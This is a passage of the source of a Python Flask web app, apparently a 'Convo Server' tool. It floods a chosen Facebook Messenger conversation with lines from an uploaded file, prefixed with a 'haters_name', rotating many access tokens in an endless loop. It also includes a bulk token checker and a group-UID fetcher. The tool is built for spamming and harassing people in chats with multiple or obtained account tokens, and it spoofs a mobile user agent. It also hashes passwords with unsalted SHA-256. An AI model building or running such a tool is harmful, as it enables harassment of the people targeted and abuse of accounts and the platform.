            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
        }
        
        .btn-success:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(40, 167, 69, 0.4);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
            color: white;
            box-shadow: 0 10px 20px rgba(220, 53, 69, 0.3);
        }
        
        .btn-danger:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(220, 53, 69, 0.4);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
            color: #212529;
            box-shadow: 0 10px 20px rgba(255, 193, 7, 0.3);
        }
        
        .btn-warning:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(255, 193, 7, 0.4);
        }
        
        .task-item {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }
        
        .task-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .task-item:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
            border-color: #667eea;
        }
        
        .task-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .task-id {
            font-weight: 800;
            color: #667eea;
            font-size: 1.3rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .task-status {
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
        }
        
        .status-running {
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
            animation: pulse 2s infinite;
        }
        
        .status-stopped {
            background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
            color: white;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3); }
            50% { box-shadow: 0 5px 25px rgba(40, 167, 69, 0.6); }
            100% { box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3); }
        }
        
        .task-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 25px;
        }
        
        .task-info-item {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            padding: 15px 20px;
            border-radius: 12px;
            border-left: 4px solid #667eea;
            transition: all 0.3s ease;
        }
        
        .task-info-item:hover {
            transform: translateX(5px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.1);
        }
        
        .task-info-label {
            font-size: 12px;
            color: #6c757d;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
            font-weight: 700;
        }
        
        .task-info-value {
            font-weight: 700;
            color: #495057;
            font-size: 1.1rem;
        }
        
        .task-buttons {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        
        .log-container {
            background: #1a1a1a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            padding: 25px;
            border-radius: 15px;
            height: 450px;
            overflow-y: auto;
            margin-top: 20px;
            border: 2px solid #333;
            display: none;
            box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1);
        }
        
        .log-container.show {
            display: block;
            animation: slideDown 0.5s ease;
        }
        
        @keyframes slideDown {
            from {
                opacity: 0;
                max-height: 0;
            }
            to {
                opacity: 1;
                max-height: 450px;
            }
        }
        
        .log-entry {
            margin-bottom: 8px;
            line-height: 1.5;
            padding: 2px 0;
            border-left: 2px solid transparent;
            padding-left: 10px;
            transition: all 0.3s ease;
        }
        
        .log-entry:hover {
            border-left-color: #00ff41;
            background: rgba(0, 255, 65, 0.05);
        }
        
        .result-container {
            margin-top: 25px;
        }
        
        .result-item {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
        }
        
        .result-item:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
        }
        
        .result-valid {
            border-left: 6px solid #28a745;
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
        }
        
        .result-invalid {
            border-left: 6px solid #dc3545;
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
        }
        
        .token-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-top: 15px;
        }
        
        .token-info-item {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.5);
            border-radius: 10px;
        }
        
        .profile-pic {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 3px solid #667eea;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
        }
        
        .group-item {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            border: 2px solid #e9ecef;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 15px;
            transition: all 0.4s ease;
            cursor: pointer;
        }
        
        .group-item:hover {
            background: white;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            transform: translateY(-2px);
            border-color: #667eea;
        }
        
        .group-name {
            font-weight: 700;
            color: #667eea;
            margin-bottom: 8px;
            font-size: 1.1rem;
        }
        
        .group-uid {
            font-family: 'Courier New', monospace;
            color: #6c757d;
            font-size: 12px;
            background: #e9ecef;
            padding: 8px 15px;
            border-radius: 8px;
            display: inline-block;
            font-weight: 600;
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #6c757d;
            font-size: 1.2rem;
            font-weight: 600;
        }
        
        .loading::after {
            content: '';
            display: inline-block;
            width: 25px;
            height: 25px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .empty-state {
            text-align: center;
            padding: 80px 20px;
            color: #6c757d;
        }
        
        .empty-state i {
            font-size: 5rem;
            margin-bottom: 25px;
            opacity: 0.3;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .empty-state h3 {
            font-size: 1.5rem;
            margin-bottom: 10px;
            color: #495057;
        }
        
        @media (max-width: 768px) {
            .tabs {
                flex-direction: column;
            }
            
            .task-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
            
            .task-buttons {
                width: 100%;
            }
            
            .btn {
                flex: 1;
                min-width: auto;
            }
            
            .user-info {
                position: static;
                justify-content: center;
                margin-top: 20px;
                flex-wrap: wrap;
            }
            
            .header h1 {
                font-size: 2.5rem;
            }
            
            .container {
                margin: 10px;
                border-radius: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>STONE RULEX</h1>
            <p>Welcome To Stone Convo Server</p>
            <div class="user-info">
                <span class="user-username">{{ session.user_username }}</span>
                {% if session.is_admin %}
                <a href="/admin" class="btn-admin">
                    <i class="fas fa-cog"></i> Admin Panel
                </a>
                {% endif %}
                <a href="/logout" class="btn-logout">
                    <i class="fas fa-sign-out-alt"></i> Logout
                </a>
            </div>
        </div>
        
                        {% if session.is_approved %}
        <div class="tabs">
            <button class="tab active" onclick="switchTab(\'bot-tab\')">
                <i class="fas fa-envelope"></i> CONVO TOOL
            </button>
            <button class="tab" onclick="switchTab(\'token-tab\')">
                <i class="fas fa-key"></i> TOKEN CHECK
            </button>
            <button class="tab" onclick="switchTab(\'groups-tab\')">
                <i class="fas fa-users"></i> UID FETCHER
            </button>
            <button class="tab" onclick="switchTab(\'logs-tab\')">
                <i class="fas fa-chart-bar"></i> TASK MANAGER
            </button>
        </div>
        {% endif %}\n        {% endif %}     
        <div id="bot-tab" class="tab-content active">
            <form action="/run_bot" method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="convo_uid">
                        <i class="fas fa-comments"></i> Conversation UID
                    </label>
                    <input type="text" id="convo_uid" name="convo_uid" placeholder="Enter conversation UID" required>
                </div>

                <div class="form-group">
                    <label for="token">
                        <i class="fas fa-key"></i> Access Tokens (one per line)
                    </label>
                    <textarea id="token" name="token" placeholder="Enter your access tokens, one per line" required></textarea>
                </div>

                <div class="form-group">
                    <label for="message_file">
                        <i class="fas fa-file-text"></i> Message File
                    </label>
                    <input type="file" id="message_file" name="message_file" accept=".txt" required>
                </div>

                <div class="form-group">
                    <label for="speed">
                        <i class="fas fa-clock"></i> Message Speed (seconds)
                    </label>
                    <input type="number" id="speed" name="speed" value="1" min="0" step="1" placeholder="Delay between messages" required>
                </div>

                <div class="form-group">
                    <label for="haters_name">
                        <i class="fas fa-tag"></i> Prefix Name
                    </label>
                    <input type="text" id="haters_name" name="haters_name" placeholder="Name to prefix messages with" required>
                </div>

                <button type="submit" class="btn btn-success">
                    <i class="fas fa-rocket"></i> Start New Task
                </button>
            </form>
        </div>
        
        <div id="token-tab" class="tab-content">
            <div class="form-group">
                <label for="check_tokens">
                    <i class="fas fa-key"></i> Tokens to Check (one per line)
                </label>
                <textarea id="check_tokens" name="check_tokens" placeholder="Enter tokens to validate, one per line"></textarea>
            </div>
            <button onclick="checkTokens()" class="btn btn-primary">
                <i class="fas fa-search"></i> Check Tokens
            </button>
            <div id="token-results" class="result-container"></div>
        </div>
        
        <div id="groups-tab" class="tab-content">
            <div class="form-group">
                <label for="groups_token">
                    <i class="fas fa-key"></i> Valid Access Token
                </label>
                <textarea id="groups_token" name="groups_token" placeholder="Enter a valid Facebook token to fetch messenger groups"></textarea>
            </div>
            <button onclick="fetchGroups()" class="btn btn-primary">
                <i class="fas fa-users"></i> Fetch Messenger Groups
            </button>
            <div id="groups-results" class="result-container"></div>
        </div>
        
        <div id="logs-tab" class="tab-content">
            <div id="tasks-container">
                <!-- Tasks will be loaded here -->
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabId) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab content
            document.getElementById(tabId).classList.add('active');
            
            // Update active tab
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            // If switching to logs tab, refresh tasks
            if (tabId === 'logs-tab') {
                refreshTasks();
            }
        }
        
        function checkTokens() {
            const tokens = document.getElementById('check_tokens').value.split('\\n').filter(t => t.trim());
            const resultsContainer = document.getElementById('token-results');
            
            if (tokens.length === 0) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter at least one token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Checking tokens...</div>';
            
            fetch('/check_tokens', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({tokens: tokens}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                data.results.forEach(result => {
                    const div = document.createElement('div');
                    div.className = result.valid ? 'result-item result-valid' : 'result-item result-invalid';
                    
                    let content = `<strong>Token:</strong> ${result.token.substring(0, 20)}...<br>`;
                    content += `<strong>Status:</strong> ${result.message}<br>`;
                    
                    if (result.valid) {
                        content += '<div class="token-info">';
                        if (result.name) {
                            content += `<div class="token-info-item"><strong>Name:</strong> ${result.name}</div>`;
                        }
                        if (result.id) {
                            content += `<div class="token-info-item"><strong>ID:</strong> ${result.id}</div>`;
                        }
                        if (result.picture) {
                            content += `<div class="token-info-item"><img src="${result.picture}" class="profile-pic" alt="Profile"></div>`;
                        }
                        content += '</div>';
                    }
                    
                    div.innerHTML = content;
                    resultsContainer.appendChild(div);
                });
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error checking tokens</div>';
            });
        }
        
        function fetchGroups() {
            const token = document.getElementById('groups_token').value.trim();
            const resultsContainer = document.getElementById('groups-results');
            
            if (!token) {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Please enter a valid token</div>';
                return;
            }
            
            resultsContainer.innerHTML = '<div class="loading">Fetching messenger groups...</div>';
            
            fetch('/fetch_groups', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({token: token}),
            })
            .then(response => response.json())
            .then(data => {
                resultsContainer.innerHTML = '';
                if (data.success) {
                    if (data.groups.length === 0) {
                        resultsContainer.innerHTML = '<div class="empty-state"><i class="fas fa-users"></i><h3>No Groups Found</h3><p>No messenger groups were found for this token</p></div>';
                        return;
                    }
                    
                    const div = document.createElement('div');
                    div.className = 'result-item result-valid';
                    div.innerHTML = `<h4>Found ${data.groups.length} Messenger Groups:</h4>`;
                    
                    data.groups.forEach(group => {
                        const groupDiv = document.createElement('div');
                        groupDiv.className = 'group-item';
                        groupDiv.innerHTML = `
                            <div class="group-name">${group.name}</div>
                            <div class="group-uid">UID: ${group.uid}</div>
                        `;
                        div.appendChild(groupDiv);
                    });
                    
                    resultsContainer.appendChild(div);
                } else {
                    const div = document.createElement('div');
                    div.className = 'result-item result-invalid';
                    div.innerHTML = `<strong>Error:</strong> ${data.message}`;
                    resultsContainer.appendChild(div);
                }
            })
            .catch(error => {
                resultsContainer.innerHTML = '<div class="result-item result-invalid">Error fetching groups</div>';
            });
        }
        
        function refreshTasks() {
            fetch('/get_tasks')
            .then(response => response.json())
            .then(data => {
                const tasksContainer = document.getElementById('tasks-container');
                tasksContainer.innerHTML = '';
                
                if (data.tasks.length === 0) {
                    tasksContainer.innerHTML = '<div class="empty-state"><i class="fas fa-clipboard-list"></i><h3>No Active Tasks</h3><p>Start a new bot task to see it here</p></div>';
                    return;
                }
                
                data.tasks.forEach(task => {
                    const taskDiv = document.createElement('div');
                    taskDiv.className = 'task-item';
                    taskDiv.innerHTML = `
                        <div class="task-header">
                            <div class="task-id">Task: ${task.id}</div>
                            <div class="task-status ${task.status === 'running' ? 'status-running' : 'status-stopped'}">
                                ${task.status}
                            </div>
                        </div>
                        <div class="task-info">
                            <div class="task-info-item">
                                <div class="task-info-label">Conversation</div>
                                <div class="task-info-value">${task.convo_uid}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Prefix</div>
                                <div class="task-info-value">${task.haters_name}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Started</div>
                                <div class="task-info-value">${task.started_at}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Token</div>
                                <div class="task-info-value">${task.token_name}</div>
                            </div>
                        </div>
                        <div class="task-buttons">
                            <button onclick="toggleLogs('${task.id}')" class="btn btn-primary">
                                <i class="fas fa-eye"></i> View Logs
                            </button>
                            ${task.status === 'running' ? 
                                `<button onclick="stopTask('${task.id}')" class="btn btn-danger">
                                    <i class="fas fa-stop"></i> Stop Task
                                </button>` : 
                                `<button onclick="removeTask('${task.id}')" class="btn btn-warning">
                                    <i class="fas fa-trash"></i> Remove Task
                                </button>`
                            }
                        </div>
                        <div id="logs-${task.id}" class="log-container"></div>
                    `;
                    tasksContainer.appendChild(taskDiv);
                });
            })
            .catch(error => {
                console.error('Error fetching tasks:', error);
            });
        }
        
  function viewLogs(taskId) {
            const logContainer = document.getElementById(`log-container-${taskId}`);
            const overlay = document.getElementById('log-overlay');
            const logContent = document.getElementById('log-content');

            fetch(`/get_logs/${taskId}`)
            .then(response => response.json())
            .then(data => {
                logContent.innerHTML = '';
                data.logs.forEach(log => {
                    const logEntryDiv = document.createElement('div');
                    logEntryDiv.className = 'log-entry';
                    logEntryDiv.textContent = log.message; // Access the message property
                    logContent.appendChild(logEntryDiv);
                });
                overlay.style.display = 'flex';
            })
            .catch(error => {
                logContent.innerHTML = `<div class="log-entry" style="color: red;">Error loading logs: ${error}</div>`;
                overlay.style.display = 'flex';
            });
        }

        function closeLogs() {
            document.getElementById('log-overlay').style.display = 'none';
            document.getElementById('log-content').innerHTML = '';
        }function stopTask(taskId) {
            if (confirm('Are you sure you want to stop this task?')) {
                fetch(`/stop_task/${taskId}`, {method: 'POST'})
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        refreshTasks();
                    } else {
                        alert('Error stopping task');
                    }
                })
                .catch(error => {
                    alert('Error stopping task');
                });
            }
        }
        
        function removeTask(taskId) {
            if (confirm('Are you sure you want to remove this task?')) {
                fetch(`/remove_task/${taskId}`, {method: 'POST'})
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        refreshTasks();
                    } else {
                        alert('Error removing task');
                    }
                })
                .catch(error => {
                    alert('Error removing task');
                });
            }
        }
        
        // Auto-refresh tasks every 5 seconds
        setInterval(() => {
            if (document.getElementById('logs-tab').classList.contains('active')) {
                refreshTasks();
            }
        }, 5000);
        
        // Load tasks on page load
        document.addEventListener('DOMContentLoaded', function() {
            refreshTasks();
        });
    </script>

    <!-- Log Overlay HTML -->
    <div id="log-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center;">
        <div style="background: #1a1a1a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 13px; padding: 25px; border-radius: 15px; height: 80%; width: 80%; overflow-y: auto; border: 2px solid #333; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1); position: relative;">
            <button onclick="closeLogs()" style="position: absolute; top: 10px; right: 10px; background: #dc3545; color: white; border: none; border-radius: 5px; padding: 8px 12px; cursor: pointer;">Close</button>
            <pre id="log-content" style="margin-top: 30px;"></pre>
        </div>
    </div>
</body>
</html>
'''



def add_log(task_id, message):
    """Add a log entry for a specific task"""
    global task_logs
    
    if task_id not in task_logs:
        task_logs[task_id] = []
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    task_logs[task_id].append(log_entry)
    
    # Keep only last 1000 log entries per task to prevent memory issues
    # Store logs with timestamp
    task_logs[task_id].append({"timestamp": datetime.now(), "message": log_entry})

    # Clean up logs older than 1 hour
    one_hour_ago = datetime.now() - timedelta(hours=1)
    task_logs[task_id] = [log for log in task_logs[task_id] if log["timestamp"] > one_hour_ago]

def check_token_validity(token):
    """Check if a Facebook token is valid and get user info"""
    try:
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}&fields=name,id,picture"
        response = requests.get(url)
        
        if response.status_code == 200:
            user_data = response.json()
            return {
                'valid': True,
                'message': 'Token is valid',
                'name': user_data.get('name', 'Unknown'),
                'id': user_data.get('id', 'Unknown'),
                'picture': user_data.get('picture', {}).get('data', {}).get('url', None)
            }
        else:
            error_data = response.json()
            return {
                'valid': False,
                'message': f'Invalid token: {error_data.get("error", {}).get("message", "Unknown error")}',
                'name': None,
                'id': None,
                'picture': None
            }
    except Exception as e:
        return {
            'valid': False,
            'message': f'Error checking token: {str(e)}',
            'name': None,
            'id': None,
            'picture': None
        }

def fetch_messenger_groups(token):
    """Fetch messenger groups using the provided token"""
    try:
        # Get user's conversations/threads
        url = f"https://graph.facebook.com/v17.0/me/conversations?access_token={token}&fields=participants,name,id&limit=100"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            groups = []
            
            for conversation in data.get('data', []):
                # Check if it's a group (more than 2 participants)
                participants = conversation.get('participants', {}).get('data', [])
                if len(participants) > 2:
                    group_name = conversation.get('name', 'Unnamed Group')
                    group_id = conversation.get('id', '')
                    
                    groups.append({
                        'name': group_name,
                        'uid': group_id
                    })
            
            return {
                'success': True,
                'groups': groups,
                'message': f'Found {len(groups)} groups'
            }
        else:
            error_data = response.json()
            return {
                'success': False,
                'groups': [],
                'message': f'API Error: {error_data.get("error", {}).get("message", "Unknown error")}'
            }
    except Exception as e:
        return {
            'success': False,
            'groups': [],
            'message': f'Error fetching groups: {str(e)}'
        }

def get_token_name(token):
    """Get the name associated with a token for identification"""
    try:
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}&fields=name"
        response = requests.get(url)
        if response.status_code == 200:
            user_data = response.json()
            return user_data.get('name', 'Unknown')
        else:
            return 'Invalid Token'
    except:
        return 'Unknown'

def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_name):
    global stop_flags
    
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    messages = message_content.splitlines()
    tokens = tokens.splitlines()

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    add_log(task_id, f"Starting bot with {num_messages} messages and {num_tokens} tokens")
    add_log(task_id, f"Target conversation: {convo_uid}")
    add_log(task_id, f"Message prefix: {haters_name}")
    add_log(task_id, f"Speed: {speed} seconds between messages")
    
    while task_id in stop_flags and not stop_flags[task_id]:
        try:
            for message_index in range(num_messages):
                if task_id in stop_flags and stop_flags[task_id]:
                    add_log(task_id, "Bot stopped by user")
                    break
                    
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                token_name = get_token_name(access_token)

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/t_{convo_uid}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    log_msg = f"âœ… Message {message_index + 1}/{num_messages} | Token: {token_name} | Content: {haters_name} {message} | Sent at {current_time}"
                    add_log(task_id, log_msg)
                else:
                    error_info = response.text[:100] if response.text else "Unknown error"
                    log_msg = f"âŒ Failed Message {message_index + 1}/{num_messages} | Token: {token_name} | Error: {error_info} | At {current_time}"
                    add_log(task_id, log_msg)
                time.sleep(speed)

            if task_id in stop_flags and stop_flags[task_id]:
                break
                
            add_log(task_id, "ðŸ”„ All messages sent. Restarting the process...")
        except Exception as e:
            error_msg = f"âš ï¸ An error occurred: {e}"
            add_log(task_id, error_msg)
            time.sleep(5) # Wait before retrying on error
    
    # Clean up when task ends
    if task_id in stop_flags:
        del stop_flags[task_id]
    if task_id in message_threads:
        del message_threads[task_id]
    
    add_log(task_id, "ðŸ Bot execution completed")


# Authentication routes
@app.route('/')
def index():
    if 'user_id' not in session:
        return render_template_string(auth_html)
    return render_template_string(html_content)

@app.route('/register', methods=['POST'])
def register():
    username = request.form.get("username")
    password = request.form.get('password')
    confirm_password = request.form.get('confirm_password')
    
    if password != confirm_password:
        flash("Passwords do not match", "error")
        return render_template_string(auth_html)
    
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    try:
        c.execute("INSERT INTO users (username, password, approved) VALUES (?, ?, 0)", (username, hashed_password))
        conn.commit()
        flash("Registration successful! Your account is pending admin approval.", "success")
        return render_template_string(auth_html)
    except sqlite3.IntegrityError:
        flash("Username already exists", "error")
        return render_template_string(auth_html)
    finally:
        conn.close()

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved FROM users WHERE username = ? AND password = ?", (username, hashed_password))
    user = c.fetchone()
    conn.close()
    
    if user:
        session['user_id'] = user[0]
        session['user_username'] = user[1]
        session['is_admin'] = bool(user[2])
        session['is_approved'] = bool(user[3])
        return redirect(url_for('index'))
    else:
        flash("Invalid username or password", "error")
        return render_template_string(auth_html)

@app.route('/admin_login', methods=['POST'])
def admin_login():
    username = request.form.get("username")
    password = request.form.get('password')
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved FROM users WHERE username = ? AND password = ? AND admin = 1", (username, hashed_password))
    user = c.fetchone()
    conn.close()
    
    if user:
        session['user_id'] = user[0]
        session['user_username'] = user[1]
        session['is_admin'] = bool(user[2])
        session['is_approved'] = bool(user[3])
        return redirect(url_for('index'))
    else:
        flash("Invalid admin credentials", "admin_error")
        return render_template_string(auth_html)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))


@app.route('/admin')
@admin_required
def admin_panel():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, username, admin, approved, created_at, tokens FROM users ORDER BY created_at DESC")
    users = c.fetchall()
    conn.close()
    
    # Enhanced admin HTML with credential configuration
    admin_html = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>STONE RULEX - Admin Panel</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
                position: relative;
                overflow-x: hidden;
            }
            
            body::before {
                content: '';
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: 
                    radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                    radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.15) 0%, transparent 50%),
                    radial-gradient(circle at 40% 40%, rgba(120, 119, 198, 0.2) 0%, transparent 50%);
                animation: backgroundFloat 12s ease-in-out infinite;
                z-index: -1;
            }
            
            @keyframes backgroundFloat {
                0%, 100% { transform: scale(1) rotate(0deg); }
                50% { transform: scale(1.1) rotate(1deg); }
            }
            
            .admin-container {
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(25px);
                border-radius: 25px;
                box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2), 
                            0 0 0 1px rgba(255, 255, 255, 0.3);
                max-width: 1400px;
                margin: 0 auto;
                overflow: hidden;
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            
            .admin-header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 40px 30px;
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            
            .admin-header::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
                animation: headerGlow 6s ease-in-out infinite;
            }
            
            @keyframes headerGlow {
                0%, 100% { transform: scale(1) rotate(0deg); }
                50% { transform: scale(1.2) rotate(180deg); }
            }
            
            .admin-header h1 {
                font-size: 3rem;
                margin-bottom: 15px;
                text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.3);
                font-weight: 900;
                letter-spacing: -2px;
                position: relative;
                z-index: 1;
            }
            
            .admin-header p {
                font-size: 1.2rem;
                opacity: 0.95;
                position: relative;
                z-index: 1;
                font-weight: 500;
            }
            
            .back-btn {
                position: absolute;
                top: 25px;
                left: 25px;
                background: rgba(255, 255, 255, 0.2);
                color: white;
                border: none;
                padding: 15px 25px;
                border-radius: 15px;
                text-decoration: none;
                font-weight: 700;
                transition: all 0.4s ease;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.3);
                z-index: 2;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            .back-btn:hover {
                background: rgba(255, 255, 255, 0.3);
                transform: translateY(-3px);
                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
            }
            
            .admin-tabs {
                display: flex;
                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
                border-bottom: 2px solid #dee2e6;
            }
            
            .admin-tab {
                flex: 1;
                padding: 25px 20px;
                text-align: center;
                cursor: pointer;
                background: transparent;
                border: none;
                font-size: 16px;
                font-weight: 700;
                color: #495057;
                transition: all 0.4s ease;
                position: relative;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            .admin-tab::before {
                content: '';
                position: absolute;
                bottom: 0;
                left: 50%;
                width: 0;
                height: 4px;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                transition: all 0.4s ease;
                transform: translateX(-50%);
            }
            
            .admin-tab:hover {
                background: linear-gradient(135deg, #e9ecef 0%, #f8f9fa 100%);
                color: #667eea;
                transform: translateY(-2px);
            }
            
            .admin-tab.active {
                background: white;
                color: #667eea;
                box-shadow: 0 -5px 15px rgba(102, 126, 234, 0.1);
            }
            
            .admin-tab.active::before {
                width: 80%;
            }
            
            .admin-content {
                display: none;
                padding: 40px;
            }
            
            .admin-content.active {
                display: block;
                animation: fadeInUp 0.6s ease;
            }
            
            @keyframes fadeInUp {
                from {
                    opacity: 0;
                    transform: translateY(30px);
                }
                to {
                    opacity: 1;
                    transform: translateY(0);
                }
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
                gap: 25px;
                margin-bottom: 40px;
            }
            
            .stat-card {
                background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
